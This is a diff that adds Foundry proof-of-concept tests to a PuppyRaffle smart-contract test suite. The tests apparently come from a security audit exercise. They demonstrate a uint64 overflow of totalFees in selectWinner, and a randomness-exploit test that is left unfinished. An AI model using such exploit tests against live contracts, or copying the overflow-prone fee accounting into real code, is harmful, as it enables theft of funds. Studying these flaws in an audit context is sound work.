@@ -305,6 +305,66 @@ contract PuppyRaffleTest is Test {
 
     }
 
+    function aliceEntered(address alice) public {
+        deal(alice, 100 ether);
+        address[] memory enterAttacker = new address[](1);
+        enterAttacker[0] = alice; 
+        vm.prank(alice);
+        puppyRaffle.enterRaffle{value:entranceFee}(enterAttacker);
+    }
+    /**
+     * @dev Complete the function later
+     */
+    function testExploitRandomnessInSelectWinner() public playersEntered {
+        address alice = makeAddr("alice");
+        aliceEntered(alice);
+
+        vm.prank(alice);
+        vm.expectRevert();
+        puppyRaffle.selectWinner();
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // vm.prank(alice);
+        // puppyRaffle.selectWinner();
+    }
+
+    function testArithmeticOverlowInSelectWinner() public playersEntered {
+        address alice = makeAddr("alice");
+        aliceEntered(alice);
+
+        address[] memory playerx = new address[](88);
+        for (uint256 idx=0; idx < 88; idx++) {
+            address player = address(uint160(idx+5));
+            playerx[idx] = player;
+        }
+
+        vm.prank(alice);
+        puppyRaffle.enterRaffle{value:entranceFee * playerx.length}(playerx);
+
+        // 93 ether
+        console.log("Contract balance before: %s", address(puppyRaffle).balance);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+
+        console.log("Total fees: %s", puppyRaffle.totalFees());
+        console.log("Actual Contract balance: %s", address(puppyRaffle).balance);
+
+        /**
+         * @notice Overflow!
+         * totalFees is uint64 and type(uint64).max is 18.4 ether. Any value beyond that overflows
+         * Desired totalFees 93 * 0.2 ~= 18.6 ether 
+         * Actual totalFees: 153255926290448384 ~ 0.15 ether
+         *  Actual contract balance: 18.6 ether
+         */
+
+        assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);
+    }
+
 }
 
 contract ReentrancyAttacker {
